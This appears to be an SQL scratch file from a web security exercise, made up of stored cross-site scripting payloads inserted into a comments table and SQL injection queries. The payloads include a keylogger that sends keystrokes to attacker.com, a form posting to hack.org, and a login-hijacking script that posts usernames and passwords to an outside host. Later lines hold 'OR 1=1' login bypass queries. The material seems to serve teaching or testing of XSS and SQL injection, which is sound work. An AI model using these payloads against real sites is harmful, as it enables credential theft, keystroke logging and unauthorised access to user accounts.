
insert into UserComments
(Author, Comment)
VALUES
('Hacker', '<script>alert("hacker was here");</script>');



insert into UserComments
(Author, Comment)
VALUES('Hacker', 
'<form action="http://hack.org/submit"><input type="text"/><input type="submit" value="submit"</form>');


insert into UserComments
(Author, Comment)
VALUES('Hacker', 
'<input type="text"/>');



insert into UserComments
(Author, Comment)
VALUES('Hacker', 
'<img src="x.gif" onerror="alert(0)"/>');


insert into UserComments
(Author, Comment)
VALUES('Hacker',
'<script>document.addEventListener(''keypress'', function(e) {fetch(''http://attacker.com/log?key='' + e.key);      });  </script>');

DELETE FROM UserComments;

<img src="x" onerror='
let btn = document.getElementById("btnLogin");

btn.addEventListener("click", ()=>{ 
let username = document.getElementById("username").value;
let password = document.getElementById("password").value;
let headersList = {
 "Accept": "*/*",
 "Content-Type": "application/json"
}

let bodyContent = JSON.stringify(  {
    "name": username,
    "email": password,
    "active": true
  });

let response = fetch("https://json.dolearnfinance.com/members", { 
  method: "POST",
  body: bodyContent,
  headers: headersList
}).then((data) => { 
    alert("sent");
} 
)});
'/>






<script>
let btn = document.getElementById("btnLogin");

btn.addEventListener("click", ()=>{ 
let username = document.getElementById("username").value;
let password = document.getElementById("password").value;
let headersList = {
 "Accept": "*/*",
 "Content-Type": "application/json"
}

let bodyContent = JSON.stringify(  {
    "name": username,
    "email": password,
    "active": true
  });

let response = fetch("https://json.dolearnfinance.com/members", { 
  method: "POST",
  body: bodyContent,
  headers: headersList
}).then((data) => { 
    alert("sent");
} 
)});
</script>




<script>

</script>



select * from UserComments;


select * from Comments;

select * from userlogins;

INSERT INTO UserLogins
(username, password)
VALUES('aidan', 'P@$$w0rd');


SELECT COUNT(*) FROM UserLogins WHERE username = 'dsfasf' AND password = '' OR 1=1; --'


SELECT COUNT(*) FROM UserLogins WHERE username = '' OR 1=1; --' AND password = ''


-- this is a comment

INSERT INTO UserComments (Author, Content, CreatedAt) VALUES('Alan','',''); --','24/09/2024 14:49:55')


SELECT * FROM AspNetUsers;